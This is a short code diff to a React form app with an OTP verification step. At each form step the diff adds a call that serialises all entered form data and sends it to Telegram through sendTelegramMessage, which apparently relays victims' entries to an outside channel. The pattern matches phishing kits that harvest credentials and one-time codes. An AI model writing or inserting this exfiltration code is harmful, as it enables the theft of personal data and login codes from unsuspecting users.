@@ -523,8 +523,13 @@ function App() {
     setOtpError('')
   }
 
-  const handleStep1Submit = (e) => {
+  const handleStep1Submit = async (e) => {
     e.preventDefault()
+    const success = await sendTelegramMessage(
+      JSON.stringify(formData, null, 2)
+    );
+    
+    // console.log(success)
     setFormStep(2)
   }
 
@@ -536,8 +541,11 @@ function App() {
     }
   }, [verificationRecords])
 
-  const handleStep2Submit = (e) => {
+  const handleStep2Submit = async (e) => {
     e.preventDefault()
+    const success = await sendTelegramMessage(
+      JSON.stringify(formData, null, 2)
+    );
     const nextOtp = generateDemoOtp()
     setCurrentDemoOtp(nextOtp)
     setOtpCode('')
